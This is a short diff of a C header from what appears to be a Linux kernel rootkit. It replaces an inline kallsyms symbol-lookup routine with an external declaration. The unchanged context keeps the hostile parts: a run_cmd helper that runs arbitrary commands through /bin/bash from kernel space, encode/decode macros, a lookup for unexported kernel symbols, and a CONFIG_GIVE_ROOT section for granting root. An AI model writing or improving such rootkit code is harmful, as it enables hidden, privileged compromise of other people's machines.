@@ -1,5 +1,4 @@
 #include <linux/version.h>
-#include <linux/kallsyms.h>
 #include <linux/cred.h>
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
@@ -10,6 +9,8 @@
 
 #define do_encrypt(ptr, len, key)	do_encode(ptr, len, key)
 #define do_decrypt(ptr, len, key)	do_encode(ptr, len, key)
+
+void *ksym_lookup_name(const char *symbol_name);
 
 static inline unsigned int custom_rol32(unsigned int val, int n)
 {
@@ -34,24 +35,6 @@ static inline int run_cmd(char *cmd)
 {
 	char *argv[] = {"/bin/bash", "-c", cmd, NULL};
 	return exec(argv);
-}
-
-static int ksym_lookup_cb(unsigned long data[], const char *name, void *module,
-			  unsigned long addr)
-{
-	int i = 0;
-	while (!module && (((const char *)data[0]))[i] == name[i]) {
-		if (!name[i++])
-			return !!(data[1] = addr);
-	}
-	return 0;
-}
-
-static inline unsigned long ksym_lookup_name(const char *name)
-{
-	unsigned long data[2] = {(unsigned long)name, 0};
-	kallsyms_on_each_symbol((void *)ksym_lookup_cb, data);
-	return data[1];
 }
 
 #ifdef CONFIG_GIVE_ROOT
